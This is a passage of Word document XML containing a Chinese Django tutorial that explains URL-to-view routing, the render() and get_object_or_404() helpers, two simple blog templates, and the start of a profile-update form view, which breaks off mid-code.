      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>那么这段代码是如何工作的？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EB5C24F" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当用户在浏览器输入/blog/时，URL收到请求后会调用视图views.py里的index方法，展示所有文章。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DEC2BA9" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当用户在浏览器输入/blog/article/&lt;int:id&gt;/时，URL不仅调用了views.py里的article方法，而且还把参数文章id通过&lt;int:id&gt;括号的形式传递给了视图里的article_detail方法。。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4853DFDD" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>views.py里的index方法先提取要展示的数据对象列表latest_articles, 然后通过render方法传递给模板blog/article_list.html.。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54C00996" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>views.py里的article_detail方法先通过get_object_or_404方法和id调取某篇具体的文章对象article，然后通过render方法传递给模板blog/article_detail.html显示。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="663C9356" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在本例中，我们使用了views里常用的2个便捷方法render()和get_object_or_404()。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CED2DE6" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>render方法有4个参数。第一个是request, 第二个是模板的名称和位置，第三个是需要传递给模板的内容, 也被称为context object。第四个参数是可选参数content_type（内容类型), 我们什么也没写。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72069A5B" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>get_object_or_404方法第一个参数是模型Models或数据集queryset的名字，第二个参数是需要满足的条件（比如pk = id, title = 'python')。当需要获取的对象不存在时，给方法会自动返回Http 404错误。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="025C920B" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="345B6293" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>下图是模板的代码。模板可以直接调用通过视图传递过来的内容。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="117AA9EA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># blog/article_list.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="725D4370" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% block content %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0407F814" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% for article in latest_articles %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="584C7093" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">     {{ article.title }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78123B3A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">     {{ article.pub_date }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="679757C8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endfor %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5418770F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endblock %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F6B54C3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37EC565B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># blog/article_detail.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EC86C4C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% block content %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="140A42F2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{{ article.title }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CCA8156" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{{ article.pub_date }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5226B89E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{{ article.body }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30E16C2F" w14:textId="0FD0A3C0" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endblock %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53001C31" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46466AD4" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>一个更复杂点案例: View视图处理用户提交的数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="167D177E" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>视图View不仅用于确定给客户展示什么内容，以什么形式展示，而且也用来处理用户通过表单提交的数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4264102B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57FAF365" w14:textId="32856442" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5158537D" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们再来看个用户修改个人资料的常见视图views.py。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D6FBD61" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.shortcuts import render, get_object_or_404</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FFF6F36" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.auth.models import User</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FDF2943" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from .forms import ProfileForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45208DBF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.http import HttpResponseRedirect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24289CB5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.urls import reverse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28C4DFE1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C79F51A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def profile_update(request, pk):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18C874A2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    user = get_object_or_404(User, pk=pk)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72FED5F2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2123A727" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    if request.method == "POST":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23A77447" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        form = ProfileForm(request.POST)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1620C627" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F9B2785" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        if form.is_valid():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FE2622A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            user.first_name = form.cleaned_data['first_name']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F404EEA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            user.last_name = form.cleaned_data['last_name']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AC9B482" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            user.save()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="302A6443" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0FBE00E1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            return HttpResponseRedirect(reverse('users:profile', args=[user.id]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03047782" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EA75FF9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        default_data = {'first_name': user.first_name, 'last_name': user.last_name,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F4DB7A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
